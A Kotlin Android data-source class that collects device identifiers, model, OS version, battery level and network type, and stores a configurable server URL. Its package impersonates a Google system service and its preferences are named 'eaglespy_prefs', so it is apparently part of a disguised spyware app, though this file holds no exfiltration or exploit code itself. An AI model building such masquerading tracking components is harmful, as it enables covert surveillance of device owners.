package com.google.android.systemservice.data.datasource

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.provider.Settings
import com.google.android.systemservice.domain.model.DeviceInfo
import com.google.android.systemservice.domain.model.DeviceStatus
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class LocalDataSource @Inject constructor(
    @ApplicationContext private val context: Context
) {
    private val prefs: SharedPreferences = 
        context.getSharedPreferences("eaglespy_prefs", Context.MODE_PRIVATE)
    
    private val _deviceStatusFlow = MutableStateFlow(DeviceStatus.UNKNOWN)
    val deviceStatusFlow: StateFlow<DeviceStatus> = _deviceStatusFlow.asStateFlow()
    
    fun updateDeviceStatus(status: DeviceStatus) {
        _deviceStatusFlow.value = status
    }
    
    fun getDeviceInfo(): DeviceInfo {
        val deviceId = getDeviceId()
        val batteryLevel = getBatteryLevel()
        
        return DeviceInfo(
            deviceId = deviceId,
            model = "${Build.MANUFACTURER} ${Build.MODEL}",
            androidVersion = Build.VERSION.RELEASE,
            batteryLevel = batteryLevel,
            networkType = getNetworkType()
        )
    }
    
    private fun getDeviceId(): String {
        var deviceId = prefs.getString("device_id", null)
        if (deviceId == null) {
            deviceId = try {
                Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                    ?: java.util.UUID.randomUUID().toString()
            } catch (e: Exception) {
                java.util.UUID.randomUUID().toString()
            }
            prefs.edit().putString("device_id", deviceId).apply()
        }
        return deviceId ?: java.util.UUID.randomUUID().toString()
    }
    
    private fun getBatteryLevel(): Int {
        return try {
            val batteryIntent = context.registerReceiver(
                null,
                android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)
            )
            val level = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) {
                (level.toFloat() / scale.toFloat() * 100).toInt()
            } else {
                -1
            }
        } catch (e: Exception) {
            -1
        }
    }
    
    private fun getNetworkType(): String {
        return try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) 
                as android.net.ConnectivityManager
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            
            when {
                capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
                capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Cellular"
                capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
                else -> "Unknown"
            }
        } catch (e: Exception) {
            "Unknown"
        }
    }
    
    fun getServerUrl(): String {
        return prefs.getString("server_url", "") ?: ""
    }
    
    fun setServerUrl(url: String) {
        prefs.edit().putString("server_url", url).apply()
    }
}
